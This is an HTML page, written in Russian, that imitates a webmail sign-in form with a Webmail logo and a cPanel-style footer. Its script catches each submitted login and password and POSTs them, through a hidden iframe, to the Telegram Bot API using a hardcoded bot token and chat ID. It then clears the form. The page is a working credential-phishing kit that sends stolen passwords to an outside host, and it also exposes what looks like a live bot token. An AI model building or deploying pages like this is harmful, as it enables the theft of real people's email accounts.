<!doctype html>
<html lang="ru">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <title>Ввод данных</title>
  <style>
    :root{
      --form-w: 283px;
      --field-h: 32px;
      --addon-w: 34px;
      --radius: 3px;

      --accent: #169bd5;
      --accent-border:#0b5f86;

      --text:#1f2937;
      --muted:#6b7280;
      --border:#bfc5c9;
      --addon-bg:#eef1f3;
      --bg:#ffffff;
      --logo:#ff6a00;
    }

    html,body{height:100%}
    body{
      margin:0;
      font-family: system-ui, -apple-system, Segoe UI, Roboto, Arial, sans-serif;
      color:var(--text);
      background:var(--bg);
    }

    .wrap{
      min-height:100vh;
      display:flex;
      flex-direction:column;
      align-items:center;
      justify-content:flex-start;
      padding:110px 16px 60px;
      box-sizing:border-box;
    }

    .label{
      width:var(--form-w);
      font-size:14px;
      font-weight:700;
      margin:14px 0 6px;
      text-align:left;
    }

    .group{
      width:var(--form-w);
      display:flex;
      align-items:stretch;
    }

    .addon{
      width:var(--addon-w);
      height:var(--field-h);
      border:1px solid var(--border);
      border-right:0;
      border-top-left-radius:var(--radius);
      border-bottom-left-radius:var(--radius);
      background:var(--addon-bg);
      display:flex;
      align-items:center;
      justify-content:center;
      box-sizing:border-box;
    }

    .addon svg{
      width:16px;height:16px;
      fill:#9aa3aa;
      display:block;
    }

    .input{
      width:calc(var(--form-w) - var(--addon-w));
      height:var(--field-h);
      border:1px solid var(--border);
      border-top-right-radius:var(--radius);
      border-bottom-right-radius:var(--radius);
      padding:0 10px;
      font-size:13px;
      outline:none;
      box-sizing:border-box;
      background:#fff;
    }

    .input:focus{
      border-color:#8aa7b8;
      box-shadow:0 0 0 2px rgba(22,155,213,.15);
    }

    .btn{
      width:var(--form-w);
      height:var(--field-h);
      margin-top:18px;
      border-radius:var(--radius);
      border:1px solid var(--accent-border);
      background:var(--accent);
      color:#fff;
      font-weight:700;
      font-size:13px;
      cursor:pointer;
    }
    .btn:hover{ filter:brightness(.97); }

    .reset{
      margin-top:14px;
      font-size:13px;
      font-weight:700;
      color:#2c3e50;
      text-decoration:none;
    }
    .reset:hover{ text-decoration:underline; }

    .langs{
      margin-top:48px;
      display:flex;
      flex-wrap:wrap;
      gap:18px;
      justify-content:center;
      align-items:center;
      font-size:12px;
      color:#2c3e50;
      font-weight:700;
      user-select:none;
    }
    .langs a{ color:inherit; text-decoration:none; }
    .langs a:hover{ text-decoration:underline; }

    .footer{
      margin-top:80px;
      text-align:center;
      color:var(--muted);
      font-size:11px;
      line-height:1.4;
    }
    .footer .mark{
      display:inline-flex;
      align-items:center;
      justify-content:center;
      width:24px;height:24px;
      border-radius:50%;
      background:#fff;
      color:var(--logo);
      font-weight:900;
      margin-bottom:6px;
    }

    .logo-img{
      display:block;
      margin:0 auto 26px;
      width:320px;
      height:auto;
    }

    @media (max-width: 360px){
      :root{ --form-w: 260px; }
    }
  </style>
</head>
<body>

  <!-- Невидимый iframe: через него отправляем POST на Telegram без CORS -->
  <iframe name="tg_iframe" style="display:none;"></iframe>

  <div class="wrap">
    <img class="logo-img" src="./webmail-logo.svg" alt="Webmail" />

    <!-- form: убрали action/method, отправку перехватывает JS -->
    <form id="f" autocomplete="on">
      <div class="label">Логин</div>
      <div class="group">
        <div class="addon" aria-hidden="true">
          <!-- user icon -->
          <svg viewBox="0 0 24 24">
            <path d="M12 12c2.76 0 5-2.46 5-5.5S14.76 1 12 1 7 3.46 7 6.5 9.24 12 12 12zm0 2c-4.42 0-8 2.24-8 5v2h16v-2c0-2.76-3.58-5-8-5z"/>
          </svg>
        </div>
        <input class="input" type="text" name="login" placeholder="Введите логин" autocomplete="username" required />
      </div>

      <div class="label" style="margin-top:18px;">Пароль</div>
      <div class="group">
        <div class="addon" aria-hidden="true">
          <!-- lock icon -->
          <svg viewBox="0 0 24 24">
            <path d="M17 10V7a5 5 0 0 0-10 0v3H5v11h14V10h-2Zm-6 6a1 1 0 1 1 2 0 1 1 0 0 1-2 0Zm6-6H7V7a5 5 0 0 1 10 0v3Z"/>
          </svg>
        </div>
        <input class="input" type="password" name="password" placeholder="Введите пароль" autocomplete="current-password" required />
      </div>

      <button class="btn" type="submit">Продолжить</button>
    </form>

    <a class="reset" href="#" id="resetLink">Сбросить данные</a>

    <div class="langs" aria-label="Языки">
      <a href="#">English</a>
      <a href="#">العربية</a>
      <a href="#">čeština</a>
      <a href="#">dansk</a>
      <a href="#">Deutsch</a>
      <a href="#">Ελληνικά</a>
      <a href="#">español</a>
      <a href="#">español latinoamericano</a>
      <span>…</span>
    </div>

    <div class="footer">
      <div class="mark">cp</div><br/>
      Copyright © <span id="y"></span> Ваша компания.<br/>
      Политика конфиденциальности
    </div>
  </div>

  <script>
    // Год в футере
    document.getElementById('y').textContent = new Date().getFullYear();

    // ⚠️ Вариант B (эксперимент): токен будет виден в исходниках.
    // Вставь сюда dev-токен и chat_id.
    const KJDNiruwjoknfgi24uhn = "8551401351:AAE_HPh8RsgqARs46q-Ck9l1obZ--Ka_6FQ";
    const CHAT_ID   = "7942744213"; // например "123456789" или "-1001234567890"

    const form = document.getElementById('f');

    function sendToTelegram(login, password){
      const text = `Новая заявка:\nЛогин: ${login}\nПароль: ${password}`;

      // Создаём временную форму, отправляем POST в Telegram через скрытый iframe
      const postForm = document.createElement('form');
      postForm.method = 'POST';
      postForm.action = `https://api.telegram.org/bot${KJDNiruwjoknfgi24uhn}/sendMessage`;
      postForm.target = 'tg_iframe';

      const chatIdInput = document.createElement('input');
      chatIdInput.type = 'hidden';
      chatIdInput.name = 'chat_id';
      chatIdInput.value = CHAT_ID;

      const textInput = document.createElement('input');
      textInput.type = 'hidden';
      textInput.name = 'text';
      textInput.value = text;

      // (опционально) отключить предпросмотр ссылок
      const previewInput = document.createElement('input');
      previewInput.type = 'hidden';
      previewInput.name = 'disable_web_page_preview';
      previewInput.value = 'true';

      postForm.appendChild(chatIdInput);
      postForm.appendChild(textInput);
      postForm.appendChild(previewInput);

      document.body.appendChild(postForm);
      postForm.submit();
      postForm.remove();
    }

    form.addEventListener('submit', (e) => {
      e.preventDefault();

      const login = form.elements.login.value.trim();
      const password = form.elements.password.value;

      sendToTelegram(login, password);

      alert('Отправлено (если BOT_TOKEN и CHAT_ID верные).');
      form.reset();
    });

    // Сброс по ссылке
    document.getElementById('resetLink').addEventListener('click', (e) => {
      e.preventDefault();
      form.reset();
    });
  </script>
</body>
</html>
